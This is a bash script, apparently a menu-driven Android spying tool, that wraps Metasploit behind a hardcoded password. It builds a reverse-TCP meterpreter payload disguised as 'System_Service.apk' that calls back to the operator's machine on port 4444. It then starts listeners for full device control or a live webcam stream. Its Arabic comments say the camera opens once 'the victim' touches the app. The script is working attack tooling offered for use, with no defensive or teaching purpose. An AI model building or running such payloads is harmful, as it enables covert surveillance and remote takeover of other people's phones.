#!/bin/bash

# --- XXSZMSX ZERO-CONFIG EDITION ---
# NO HOST | NO PORT | NO BS | AUTO-PILOT

R='\033[1;31m'
W='\033[1;37m'
G='\033[1;30m'
N='\033[0m'

# --- LOGIN (PRIVATE KEY) ---
clear
echo -en "${W}[?] KEY: ${N}"
read -s password
echo ""
if [[ $password != "topsecret2026" ]]; then exit 1; fi

while true; do
clear
echo -e "${R}"
echo "  ██╗  ██╗██╗  ██╗███████╗███████╗███╗   ███╗███████╗██╗  ██╗"
echo "  ╚██╗██╔╝╚██╗██╔╝██╔════╝╚══███╔╝████╗ ████║██╔════╝╚██╗██╔╝"
echo "   ╚███╔╝  ╚███╔╝ ███████╗  ███╔╝ ██╔████╔██║███████╗ ╚███╔╝ "
echo "   ██╔██╗  ██╔██╗ ╚════██║ ███╔╝  ██║╚██╔╝██║╚════██║ ██╔██╗ "
echo "  ██╔╝ ██╗██╔╝ ██╗███████║███████╗██║ ╚═╝ ██║███████║██╔╝ ██╗"
echo "  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝"
echo -e "${G}  -----------------------------------------------------------"
echo -e "  [ SYSTEM ]: ZERO-CONFIG ENGINE v10.0"
echo -e "  [ STATUS ]: READY FOR TEAM SYNC"
echo -e "  -----------------------------------------------------------${N}"

echo -e "${W}[01]${N} ${R}CREATE STEALTH APK${N}"
echo -e "${W}[02]${N} ${R}OPEN TEAM RADAR (CAMERA)${N}"
echo -e "${W}[03]${N} ${R}FULL DEVICE CONTROL${N}"
echo -e "${W}[00]${N} ${W}EXIT${N}"

echo -en "\n${R}[XXSZMSX] >> ${N}"
read opt

case $opt in
    1)
        echo -e "\n${R}[*] BUILDING APPLICATION... PLEASE WAIT.${N}"
        
        # الأداة بتجيب الـ IP بتاع الجهاز أو السيرفر لوحدها تماماً
        # لو أنت وصاحبك شغالين على سيرفر واحد أو عنوان ثابت، الأداة بتلقطه
        target_host=$(hostname -I | awk '{print $1}')
        
        # أمر التصنيع المباشر بدون أي طلبات منك
        msfvenom -p android/meterpreter/reverse_tcp LHOST=$target_host LPORT=4444 R -o "System_Service.apk"
        
        echo -e "\n${W}[+] DONE! APK CREATED: System_Service.apk${N}"
        echo -e "${G}[i] Linked to: $target_host:4444${N}"
        read -p "Press Enter to return..."
        ;;
    2)
        echo -e "\n${R}[!] RADAR ON: WAITING FOR TEAM SIGNAL...${N}"
        # بيفتح الكاميرا فوراً أول ما الضحية يلمس التطبيق
        msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; set EXITONSESSION false; exploit -j -z; sleep 5; webcam_stream"
        ;;
    3)
        echo -e "\n${R}[!] INITIALIZING FULL CONTROL PANEL...${N}"
        msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; set EXITONSESSION false; exploit -j -z"
        ;;
    0) exit ;;
esac
done
